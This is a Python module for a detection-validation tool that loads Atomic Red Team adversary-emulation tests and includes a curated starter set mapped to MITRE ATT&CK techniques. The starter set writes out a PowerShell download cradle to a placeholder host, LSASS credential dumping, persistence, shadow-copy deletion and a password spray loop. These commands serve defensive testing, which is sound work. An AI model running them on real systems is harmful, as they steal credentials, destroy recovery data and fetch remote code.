"""Atomic Red Team catalog (P3 #3.5).

Red Canary's Atomic Red Team (github.com/redcanaryco/atomic-red-team)
ships ~1500 tests as YAML, organised by MITRE ATT&CK technique ID
under ``atomics/T*``. We don't bundle the full corpus — operators
clone the repo locally and point ``ARGUS_ATOMIC_RED_TEAM_PATH`` at
the ``atomics/`` directory.

When the path isn't set, a hand-curated 14-test starter set ships
inline so the validation loop has *something* to run against the
common techniques (T1059.001 PowerShell, T1003.001 LSASS, T1071.001
HTTP C2, T1486 ransomware, …).

Public surface:
  available()                    detect filesystem path or fall back
                                 to the curated starter
  list_techniques()              every ATT&CK technique we have at
                                 least one test for
  tests_for(technique_id)        list of AtomicTest for that technique

Curated tests deliberately reference ``example.invalid`` for outbound
HTTP / DNS — that's a non-routable TLD per RFC 6761, so the request
goes nowhere, but it WILL trigger NXDOMAIN telemetry, EDR
suspicious-domain alerts, and SIEM noise. **That is the point**: the
operator is verifying that their detections fired. If a curated test
runs and the SIEM stays silent, the *detection* is broken — not the
test. Document this in the operator runbook before they file a
support ticket.
"""

from __future__ import annotations

import logging
import os
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


# ── Curated starter pack (used when the full repo path isn't set) ───


@dataclass
class AtomicTest:
    technique_id: str
    name: str
    description: str
    supported_platforms: list[str]
    executor_type: str        # "powershell" | "command_prompt" | "bash" | "sh"
    executor_command: str
    cleanup_command: str | None = None
    auto_generated_guid: str | None = None
    source: str = "argus_curated"

    def to_dict(self) -> dict[str, Any]:
        return {
            "technique_id": self.technique_id,
            "name": self.name,
            "description": self.description,
            "supported_platforms": list(self.supported_platforms),
            "executor_type": self.executor_type,
            "executor_command": self.executor_command,
            "cleanup_command": self.cleanup_command,
            "auto_generated_guid": self.auto_generated_guid,
            "source": self.source,
        }


_CURATED_TESTS: list[AtomicTest] = [
    AtomicTest(
        technique_id="T1059.001", name="PowerShell IEX download cradle",
        description="Classic IEX download cradle reading a remote string.",
        supported_platforms=["windows"], executor_type="powershell",
        executor_command=(
            "iex (New-Object Net.WebClient).DownloadString('https://example.invalid/x.ps1')"
        ),
    ),
    AtomicTest(
        technique_id="T1059.001", name="Encoded PowerShell command",
        description="-EncodedCommand abuse for evasion.",
        supported_platforms=["windows"], executor_type="powershell",
        executor_command=(
            "powershell.exe -nop -w hidden -enc "
            "VwByAGkAdABlAC0ASABvAHMAdAAgACIAaABlAGwAbABvACIA"
        ),
    ),
    AtomicTest(
        technique_id="T1059.005", name="VBA macro spawn cmd.exe",
        description="Office macro spawning cmd.exe — covers AMSI/EDR detection.",
        supported_platforms=["windows"], executor_type="command_prompt",
        executor_command='cmd.exe /c "echo macro"',
    ),
    AtomicTest(
        technique_id="T1003.001", name="LSASS memory dump (procdump)",
        description="Dump LSASS via SysInternals procdump.",
        supported_platforms=["windows"], executor_type="command_prompt",
        executor_command="procdump.exe -accepteula -ma lsass.exe lsass.dmp",
        cleanup_command="del lsass.dmp",
    ),
    AtomicTest(
        technique_id="T1003.001", name="LSASS memory via comsvcs.dll",
        description="MiniDump via rundll32 comsvcs.dll.",
        supported_platforms=["windows"], executor_type="powershell",
        executor_command=(
            "rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll, "
            "MiniDump (Get-Process lsass).Id "
            "C:\\\\Windows\\\\Temp\\\\lsass.dmp full"
        ),
    ),
    AtomicTest(
        technique_id="T1547.001", name="Registry Run key persistence",
        description="HKCU\\...\\Run autorun entry.",
        supported_platforms=["windows"], executor_type="command_prompt",
        executor_command=(
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v ArgusAtomic /t REG_SZ /d "C:\\\\Windows\\\\System32\\\\notepad.exe" /f'
        ),
        cleanup_command=(
            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v ArgusAtomic /f'
        ),
    ),
    AtomicTest(
        technique_id="T1053.005", name="Scheduled task — schtasks /create",
        description="Schedule a benign task to validate scheduled-task detection.",
        supported_platforms=["windows"], executor_type="command_prompt",
        executor_command=(
            'schtasks /create /tn ArgusAtomic /tr "cmd.exe /c echo hi" '
            '/sc minute /mo 5'
        ),
        cleanup_command="schtasks /delete /tn ArgusAtomic /f",
    ),
    AtomicTest(
        technique_id="T1071.001", name="HTTP beacon to attacker host",
        description="Curl-style outbound HTTP to a known-bad host.",
        supported_platforms=["windows", "linux", "macos"],
        executor_type="bash",
        executor_command="curl -sk https://example.invalid/beacon",
    ),
    AtomicTest(
        technique_id="T1071.004", name="DNS tunneling via nslookup",
        description="Query suspicious long subdomain to validate DNS-tunnel detection.",
        supported_platforms=["windows", "linux", "macos"],
        executor_type="bash",
        executor_command=(
            "nslookup "
            "longsubdomain.argus-emulation.example.invalid"
        ),
    ),
    AtomicTest(
        technique_id="T1486", name="Encrypt files in scratch dir (sim)",
        description=(
            "Encrypt a small set of dummy files with PowerShell — "
            "validates ransomware-encryption detection without touching "
            "real user data."
        ),
        supported_platforms=["windows"], executor_type="powershell",
        executor_command=(
            "$d='C:\\\\Windows\\\\Temp\\\\argus_atomic_t1486'; New-Item -ItemType Directory $d; "
            "1..10 | ForEach-Object { 'data' | Set-Content \"$d\\\\f$_.txt\" }; "
            "Get-ChildItem $d | ForEach-Object { Set-Content $_.FullName ([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content $_)))) }"
        ),
        cleanup_command=(
            "Remove-Item -Recurse -Force C:\\\\Windows\\\\Temp\\\\argus_atomic_t1486"
        ),
    ),
    AtomicTest(
        technique_id="T1490", name="Delete shadow copies via vssadmin",
        description="Inhibit recovery by deleting VSS snapshots.",
        supported_platforms=["windows"], executor_type="command_prompt",
        executor_command="vssadmin.exe delete shadows /all /quiet",
    ),
    AtomicTest(
        technique_id="T1190", name="Outbound probe of internet-exposed app",
        description="Scan an internet-exposed host for typical exploit endpoints.",
        supported_platforms=["linux", "macos"],
        executor_type="bash",
        executor_command=(
            "curl -sk -o /dev/null -w '%{http_code}' "
            "https://example.invalid/admin/ping.php"
        ),
    ),
    AtomicTest(
        technique_id="T1078.004", name="AWS ListBuckets with stolen key",
        description=(
            "List S3 buckets — validates cloud-account-takeover detection "
            "in the customer's CSPM / GuardDuty."
        ),
        supported_platforms=["linux", "macos"],
        executor_type="bash",
        executor_command="aws s3 ls --no-cli-pager",
    ),
    AtomicTest(
        technique_id="T1110.003", name="Password spray via curl",
        description=(
            "Repeated authentication attempts against a known-good "
            "endpoint with rotating usernames."
        ),
        supported_platforms=["linux", "macos"],
        executor_type="bash",
        executor_command=(
            "for u in alice bob carol dave; do "
            "curl -sk -u $u:Spring2026! "
            "https://login.argusdemo.bank/ -o /dev/null; done"
        ),
    ),
]


# ── Filesystem loader ───────────────────────────────────────────────


def _root_path() -> str | None:
    p = (os.environ.get("ARGUS_ATOMIC_RED_TEAM_PATH") or "").strip()
    if p and os.path.isdir(p):
        return p
    return None


_FS_CACHE: dict[str, list[AtomicTest]] | None = None


def _load_filesystem(root: str) -> dict[str, list[AtomicTest]]:
    """Walk ``root/T*`` and parse the per-technique YAML.

    Atomic Red Team's directory shape is ``atomics/<T1234>/<T1234>.yaml``.
    """
    global _FS_CACHE
    if _FS_CACHE is not None:
        return _FS_CACHE
    out: dict[str, list[AtomicTest]] = {}
    try:
        import yaml
    except ImportError:
        logger.warning("[atomic_red_team] PyYAML not installed; filesystem loader disabled")
        _FS_CACHE = out
        return out
    for name in sorted(os.listdir(root)):
        if not name.startswith("T"):
            continue
        tdir = os.path.join(root, name)
        ydir = os.path.join(tdir, f"{name}.yaml")
        if not os.path.exists(ydir):
            continue
        try:
            with open(ydir, encoding="utf-8") as fh:
                doc = yaml.safe_load(fh)
        except Exception as exc:  # noqa: BLE001
            logger.warning("[atomic_red_team] failed to parse %s: %s", ydir, exc)
            continue
        tid = (doc or {}).get("attack_technique") or name
        for t in (doc or {}).get("atomic_tests", []) or []:
            if not isinstance(t, dict):
                continue
            executor = t.get("executor") or {}
            out.setdefault(tid, []).append(AtomicTest(
                technique_id=tid,
                name=t.get("name", "")[:200],
                description=t.get("description", "")[:1000],
                supported_platforms=list(t.get("supported_platforms") or []),
                executor_type=executor.get("name", ""),
                executor_command=executor.get("command", ""),
                cleanup_command=executor.get("cleanup_command"),
                auto_generated_guid=t.get("auto_generated_guid"),
                source="atomic_red_team_filesystem",
            ))
    _FS_CACHE = out
    logger.info("[atomic_red_team] loaded %d techniques from %s",
                len(out), root)
    return out


def _curated_index() -> dict[str, list[AtomicTest]]:
    out: dict[str, list[AtomicTest]] = {}
    for t in _CURATED_TESTS:
        out.setdefault(t.technique_id, []).append(t)
    return out


def _index() -> dict[str, list[AtomicTest]]:
    root = _root_path()
    if root:
        fs = _load_filesystem(root)
        if fs:
            return fs
    return _curated_index()


# ── Public surface ──────────────────────────────────────────────────


def available() -> dict[str, Any]:
    root = _root_path()
    return {
        "filesystem_path": root,
        "filesystem_active": bool(root and _load_filesystem(root)),
        "curated_count": len(_CURATED_TESTS),
        "techniques_indexed": len(_index()),
    }


def list_techniques() -> list[str]:
    return sorted(_index().keys())


def tests_for(technique_id: str) -> list[AtomicTest]:
    return list(_index().get(technique_id, []))


def reset_cache() -> None:
    """Used by tests to re-detect ARGUS_ATOMIC_RED_TEAM_PATH after
    monkeypatching."""
    global _FS_CACHE
    _FS_CACHE = None
